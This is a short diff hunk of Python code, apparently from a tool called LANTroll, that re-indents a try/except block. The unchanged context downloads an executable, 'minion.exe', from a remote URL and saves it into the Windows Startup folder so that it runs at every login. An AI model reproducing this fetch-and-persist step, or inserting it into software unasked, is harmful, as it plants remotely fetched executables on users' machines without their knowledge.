@@ -157,9 +157,9 @@ loop
         downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
         url = 'https://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
         print("Installing")
-	try:
+        try:
             urllib.urlretrieve(url, downloadlocation)
-	except:
+        except:
             print("Well, somethings wrong")
         print("Done")
 
